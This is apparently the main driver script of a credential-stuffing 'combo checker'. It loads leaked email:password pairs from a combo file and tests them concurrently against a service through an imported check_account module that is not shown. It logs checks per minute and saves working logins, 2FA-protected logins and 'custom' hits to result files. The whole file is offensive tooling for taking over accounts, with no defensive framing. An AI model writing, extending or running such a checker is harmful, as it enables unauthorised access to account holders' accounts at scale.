import os
import threading
import concurrent.futures
from colorama import Fore, Style, init
from src.calculator import calculator
from src.api.check import check_account

init()

lock = threading.Lock()
hits_path = "results/hits.txt"
nfa_path = "results/nfa.txt"  
custom_path = "results/custom.txt"

def create_directory(path):
    if not os.path.exists(path):
        os.makedirs(path)

def create_result_files():
    create_directory("results")

    for path in [hits_path, nfa_path, custom_path]:
        if not os.path.exists(path):
            with open(path, "w"):
                pass

create_result_files()

def check_account_wrapper(combo):
    parts = combo.split(":")
    if len(parts) < 2:
        with lock:
            calculator.increment()
            print(f"({Fore.RED}CPM={calculator.calculate()}{Style.RESET_ALL}) {Fore.RED}ERROR Invalid combo format: {combo}{Style.RESET_ALL}")
        return

    email, password = parts[0], ":".join(parts[1:])

    try:
        response = check_account(email, password)
        handle_response(response, email, password)
    except Exception as e:
        with lock:
            calculator.increment()
            print(f"({Fore.RED}CPM={calculator.calculate()}{Style.RESET_ALL}) {Fore.RED}ERROR {str(e)} - Username: {email}, Password: {password}{Style.RESET_ALL}")

def handle_response(response, email, password):
    status_color = Fore.WHITE
    status = ""

    with lock:
        calculator.increment()
        cpm_value = calculator.calculate()

        if response.get("status") == "ok":
            status_color = Fore.GREEN
            status = "LIVE"
            save_hit(email, password)
        elif response.get("status") == "nfa":
            status_color = Fore.YELLOW
            status = "2FA"
            save_nfa(email, password)
        elif response.get("status") == "custom":
            status_color = Fore.YELLOW
            status = "CUSTOM"
            save_custom(email, password)
        elif response.get("status") == "fail":
            status_color = Fore.RED
            status = "DEAD"
        elif response.get("status") == "retry":
            status_color = Fore.BLUE
            status = "RETRY"
        else:
            error = response.get("message", "Unknown error")
            status_color = Fore.RED
            status = f"ERROR: {error}"

        print(f"({Fore.MAGENTA}CPM={cpm_value}{Style.RESET_ALL}) {status_color}{status}{Style.RESET_ALL} {email}:{password}")

def save_hit(email, password):
    with open(hits_path, "a") as f:
        f.write(f"{email}:{password}\n")

def save_nfa(email, password):
    with open(nfa_path, "a") as f:
        f.write(f"{email}:{password}\n")

def save_custom(email, password):
    with open(custom_path, "a") as f:
        f.write(f"{email}:{password}\n")

def start_checking(thread_count):    
    try:
        with open("data/combo.txt", "r", encoding="utf-8") as f:
            combos = [line.strip() for line in f if line.strip()]
    except UnicodeDecodeError:
        try:
            with open("data/combo.txt", "r", encoding="utf-8", errors="ignore") as f:
                combos = [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError:
            with open("data/combo.txt", "r", encoding="latin-1") as f:
                combos = [line.strip() for line in f if line.strip()]

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        executor.map(check_account_wrapper, combos)

    print(f"\n{Fore.GREEN}Checking complete!{Style.RESET_ALL}")
    input(f"{Fore.CYAN}Press Enter to exit...{Style.RESET_ALL}")